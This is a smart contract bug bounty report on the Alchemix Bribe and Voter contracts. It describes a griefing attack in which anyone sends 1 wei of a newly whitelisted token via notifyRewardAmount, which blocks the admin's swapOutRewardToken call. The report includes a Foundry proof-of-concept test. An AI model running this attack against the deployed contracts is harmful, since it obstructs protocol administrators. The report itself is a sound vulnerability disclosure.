# 30985 - \[SC - Medium] Griefing attack prevents admins from disabling ...

Submitted on May 10th 2024 at 03:16:13 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30985

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Description

The `Voter` smart contract can whitelist - and remove from the whitelist - tokens with the functions:

```
function whitelist(address _token) public {
    require(msg.sender == admin, "not admin");
    require(_token != address(0), "cannot be zero address");
    _whitelist(_token);
}
function removeFromWhitelist(address _token) external {
    require(msg.sender == admin, "not admin");
    _removeFromWhitelist(_token);
}
```

The Voter's whitelist is used in the `Bribe` smart contract to ensure only whitelisted tokens are **enabled** when calling `Bribe.addRewardToken(...)`.

In Bribe, it is impossible to disable a token explicitly; it is only possible for admins to "**disable an already enabled token while replacing it with a new one**" calling `Voter.swapReward(...)`, then the Voter smart contract will call `Bribe.swapOutRewardToken(...)`.

```
/// @inheritdoc IVoter
function swapReward(address gaugeAddress, uint256 tokenIndex, address oldToken, address newToken) external {
    require(msg.sender == admin, "only admin can swap reward tokens");
    IBribe(bribes[gaugeAddress]).swapOutRewardToken(tokenIndex, oldToken, newToken);
}
```

> swapReward in Voter

```
function swapOutRewardToken(uint256 oldTokenIndex, address oldToken, address newToken) external {
    // code here removed for simplicity

    isReward[oldToken] = false;
    isReward[newToken] = true;

    // code here removed for simplicity
}
```

> swapOutRewardToken in Bribe

We discover a griefing attack that makes the `swapOutRewardToken(...)` revert, preventing reward tokens from being disabled.

## Vulnerability Details

The `swapOutRewardToken(...)` function requires the new token that admins are trying to replace the old token with not to exist. (**rewards\[newToken]** must be equal to false).

```
function swapOutRewardToken(uint256 oldTokenIndex, address oldToken, address newToken) external {
    require(msg.sender == voter, "Only voter can execute");
    require(IVoter(voter).isWhitelisted(newToken), "New token must be whitelisted");
    require(rewards[oldTokenIndex] == oldToken, "Old token mismatch");

    // Check that the newToken does not already exist in the rewards array
    for (uint256 i = 0; i < rewards.length; i++) {
        require(rewards[i] != newToken, "New token already exists");
    }

    isReward[oldToken] = false;
    isReward[newToken] = true;

    // Since we've now ensured the new token doesn't exist, we can safely update
    rewards[oldTokenIndex] = newToken;

    emit RewardTokenSwapped(oldToken, newToken);
}
```

> Github link: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L138-L155>

### Attack vector

The logic of the public function `Bribe.notifyRewardAmount(token, amount)`, automatically enables any whitelisted token you pass as a parameter if it is not already enabled so the attack vector is:

**Step 1-** An admin whitelists a token in **Voter** (say **DAI**) to replace the old reward token with it.

**Step 2-** A malicious entity calls `Bribe.notifyRewardAmount(DAI, 1)` sending **1 wei** of day. The **DAI** token will be enabled automatically.

**Step 3-** The admin calls `Voter.swapReward(...)` to disable the old token and enable **DAI**, but his transaction reverts because **DAI** is already enabled.

Hence, the old reward token can't be disabled.

## Impact Details

Griefing attack that prevents admin from disabling a token.

> The 5-reports/48-hours limit makes time management crucial, and every day we invest in attempting to escalate the impact of a specific report decreases the total number of bugs we can submit to the Boost.
>
> We suspect the impact could be increased from griefing to a denial of service in parts of the protocol or the Bribe itself, but we can't afford to allocate time to dig deeper.

## Proof of Concept

The following test replicates the attack vector.

Add it to `alchemix-v2-dao/src/test/Voting.t.sol`:

```
    function testFrontRunningSwapOutRewardToken() public {

        // Get the bribe address
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Whitelist USDT
        hevm.prank(address(timelockExecutor));
        voter.whitelist(usdt);

        // Add USDT as a reward token
        hevm.prank(address(sushiGauge));
        IBribe(bribeAddress).addRewardToken(usdt);

        // Check that the reward token at index 0 is ACLX and reward token at index 1 is USDT
        assertEq(IBribe(bribeAddress).rewards(0), address(alcx), "reward token should be alcx");
        assertEq(IBribe(bribeAddress).rewards(1), usdt, "reward token should be usdt");

        // Whitelist DAI
        hevm.prank(address(timelockExecutor));
        voter.whitelist(dai);

        // Create attacker address
        address attacker = address(0x99);
        // Give the attacker 1 wei of DAI
        deal(address(dai), attacker, 1);
        // Prank the attacker
        hevm.prank(attacker);
        // Approve the bribe to spend 1 wei of DAI
        IERC20(dai).approve(bribeAddress, 1);
        // Prank the attacker
        hevm.prank(attacker);
        // Sends 1 wei of DAI to the bribe, then adds the DAI token
        // as reward and prevents admins from removing the USDT token as reward
        IBribe(bribeAddress).notifyRewardAmount(dai, 1);
        
        // Admin attempts to swap out USDT for DAI - but his transaction reverts
        // USDT can't be removed from the list of reward tokens
        hevm.expectRevert(abi.encodePacked("New token already exists"));
        hevm.prank(address(voter));
        IBribe(bribeAddress).swapOutRewardToken(1, usdt, dai);

    }
```
